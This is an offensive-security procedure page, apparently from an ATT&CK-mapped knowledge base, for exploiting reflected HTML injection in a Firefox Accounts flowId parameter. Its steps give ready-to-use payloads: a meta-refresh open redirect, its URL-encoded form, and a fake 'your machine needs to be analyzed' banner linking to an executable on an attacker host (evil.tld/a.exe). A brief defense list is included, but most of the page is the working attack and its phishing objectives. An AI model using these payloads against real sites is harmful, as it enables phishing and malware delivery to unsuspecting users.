---
id: proc-uuid-2
name: Craft-Malicious-HTML-Injection-Payloads
tags:
  - payload-craft
  - html-injection
  - open-redirect
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/echo-payload]]'
  - '[[commands/url-encode-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:47:23.624Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-HTML-Injection-Payloads

## Summary

This procedure crafts and tests HTML injection payloads for the flowId parameter, focusing on script-less attacks like open redirects and UI redressing that evade CSP restrictions.

## Description

Targeting the vulnerable reflection in Firefox Accounts settings, payloads inject meta tags for redirects or HTML for phishing UI. Technical approach involves URL encoding to ensure delivery. Prerequisites: knowledge of HTML and URL encoding. Outcomes: functional payloads leading to victim redirection or interaction without JS.

## Requirements

1. URL encoding capability
2. Test browser to validate payloads
3. Attacker-controlled domain for redirects

## Defense

Defensive measures and detection strategies:

- Sanitize inputs with HTML parsers that neutralize tags
- Enforce CSP nonce or strict-dynamic for HTML
- Log and alert on suspicious payloads in flowId

## Objectives

1. Create redirect payloads bypassing CSP
2. Develop UI redressing for phishing
3. Test for potential data exfil via connect-src

## Instructions

### Step 1: Generate Open Redirect Payload

**Context**: Create a meta refresh tag to redirect to attacker site.

**Command** ([[commands/echo-payload]]):
```bash
echo '"'><meta http-equiv="refresh" content="1; http://example.com">'
```

> Output: The raw payload; encode it for URL use.

### Step 2: Encode and Test Payload

**Context**: URL-encode the payload and append to the endpoint.

**Command** ([[commands/url-encode-payload]]):
```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('\"\'><meta http-equiv=\"refresh\" content=\"1; http://example.com\">'))"
```

> Use the encoded string in URL: ?flowId=encoded_payload. Visit in browser to confirm redirect.

### Step 3: Craft UI Redressing Payload

**Context**: Inject fake HTML to trick user into actions.

**Command** ([[commands/echo-payload]]):
```bash
echo 'e587d1d6ceb"><h1>Your machine needs to be analyzed. Please download and run this file to continue: <a href="http://evil.tld/a.exe">Click here to Download</a></h1><!--'
```

> Test by loading the URL; observe rendered phishing prompt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/echo-payload]]
- [[commands/url-encode-payload]]

## Tools Used


## Tags

- [[payload]]
- [[Phishing]]
